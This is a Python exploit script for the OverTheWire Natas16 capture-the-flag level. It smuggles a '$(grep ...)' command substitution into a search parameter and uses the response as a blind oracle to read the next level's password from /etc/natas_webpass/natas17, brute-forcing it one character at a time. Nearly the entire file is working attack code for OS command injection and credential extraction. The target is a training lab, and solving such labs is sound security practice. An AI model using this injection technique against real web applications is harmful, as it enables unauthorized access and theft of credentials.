#!/usr/bin/env python3
"""

Usage:
    python natas16.py --user natas16 --pass YOUR_PASSWORD

Notes:
- Provide credentials via CLI.
- Keep a polite delay between requests to avoid flooding the lab.
"""
import argparse
import string
import time
import sys
import requests
from requests.auth import HTTPBasicAuth

DEFAULT_URL = "http://natas16.natas.labs.overthewire.org/"
DEFAULT_LENGTH = 32
DEFAULT_DELAY = 0.08  # seconds


def probe(session, url, auth, prefix, char, timeout=8):
    """Return True if prefix+char is a correct prefix of the password."""
    needle = f"$(grep ^{prefix}{char} /etc/natas_webpass/natas17)zooming"
    params = {"needle": needle, "submit": "Search"}
    try:
        r = session.get(url, params=params, auth=auth, timeout=timeout)
        r.raise_for_status()
    except requests.RequestException as e:
        print(f"[!] Request error: {e}")
        return None

    # If "zooming" is NOT in the response, grep printed something -> match found
    return "zooming" not in r.text


def find_password(url, auth, length=DEFAULT_LENGTH, delay=DEFAULT_DELAY, charset=None):
    if charset is None:
        charset = string.ascii_letters + string.digits

    session = requests.Session()
    session.headers.update({"User-Agent": "natas-simple-enum/1.0"})

    password = ""
    print(f"[+] Starting enumeration (expected length={length})")

    while len(password) < length:
        matched = False
        for c in charset:
            res = probe(session, url, auth, password, c)
            if res is None:
                # transient error; wait a bit and retry this char once
                time.sleep(delay * 2)
                res = probe(session, url, auth, password, c)
                if res is None:
                    print(f"[!] Skipping '{c}' due to repeated errors")
                    continue

            if res:
                password += c
                print(f"[+] Found: {c}   ->  {password}")
                matched = True
                break

            time.sleep(delay)

        if not matched:
            print("[!] No character matched for current position. Stopping.")
            break

    return password


def parse_args():
    p = argparse.ArgumentParser(description="Simple Natas16 -> Natas17 enumerator")
    p.add_argument("--url", default=DEFAULT_URL, help="Target URL (default Natas16)")
    p.add_argument("--user", required=True, help="Username (e.g. natas16)")
    p.add_argument("--pass", dest="password", required=True, help="Password for the user")
    p.add_argument("--length", type=int, default=DEFAULT_LENGTH, help="Expected password length")
    p.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Delay between requests (sec)")
    return p.parse_args()


def main():
    args = parse_args()
    auth = HTTPBasicAuth(args.user, args.password)
    try:
        pw = find_password(args.url, auth, length=args.length, delay=args.delay)
        print(f"\n[+] Result (partial/full): {pw}")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(1)


if __name__ == "__main__":
    main()
